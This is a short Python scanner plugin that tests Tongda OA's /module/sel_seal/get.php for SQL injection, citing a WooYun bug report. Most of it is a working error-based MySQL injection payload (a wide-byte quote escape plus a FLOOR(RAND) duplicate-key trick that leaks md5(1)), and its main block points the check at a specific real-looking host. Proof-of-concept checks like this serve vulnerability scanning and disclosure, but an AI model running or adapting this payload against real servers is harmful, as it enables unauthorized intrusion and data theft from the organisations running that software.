#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 通达OA系统  /module/sel_seal/get.php SQL注入漏洞
#references = http://www.wooyun.org/bugs/wooyun-2010-0159498

def assign(service, arg):
    if service == "tongdaoa":
        return True, arg

def audit(arg):
    target = arg + "module/sel_seal/get.php?ID=%df%27%20AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%280x7e7e7e%2C%28MID%28%28IFNULL%28CAST%28md5%281%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x7e7e7e%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29--%20xxx"
    code, head,res, errcode, _   = curl.curl2(target)
    if code==200 and  'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://yc.csc001.com/')[1])